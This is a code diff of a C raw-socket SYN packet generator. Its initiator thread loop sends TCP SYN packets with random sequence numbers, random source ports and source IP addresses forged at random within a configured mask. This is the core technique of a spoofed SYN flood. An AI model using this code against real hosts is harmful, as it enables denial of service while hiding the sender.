@@ -7,10 +7,6 @@
 #include "initiator.h"
 #include "options.h"
 
-void sendsyn() {
-
-}
-
 void * initiator(void * p_data) {
     struct parameters * params = (struct parameters *) p_data;
     u_char *buffer;
@@ -46,11 +42,10 @@ void * initiator(void * p_data) {
 
     srand( time( NULL ) );
     while (1) {
-        
         if(!pause_(0)){
-            tcp->seq = port;
-            tcp->source = htons(port);
-            ip->saddr = htonl((rand() | 0x01000000) & 0x01ffffff);//htonl(ips++);
+            tcp->seq = rand();
+            tcp->source = rand();
+            ip->saddr = (htonl(rand()) &  (~params->sin_src_mask.sin_addr.s_addr) | params->sin_src.sin_addr.s_addr);
             tcp->check = 0;
             tcp->check = tcp_cksum(tcp, sizeof (struct tcphdr), ip->daddr, ip->saddr);
             if (sendto(params->socket, buffer, ip->tot_len, 0, (struct sockaddr *) &(params->sin_dst), sizeof (params->sin_dst)) < 0) {
@@ -59,6 +54,6 @@ void * initiator(void * p_data) {
             }
             syn_sent();
         }
-        usleep(100000);
+        sleep(1);
     }
 }
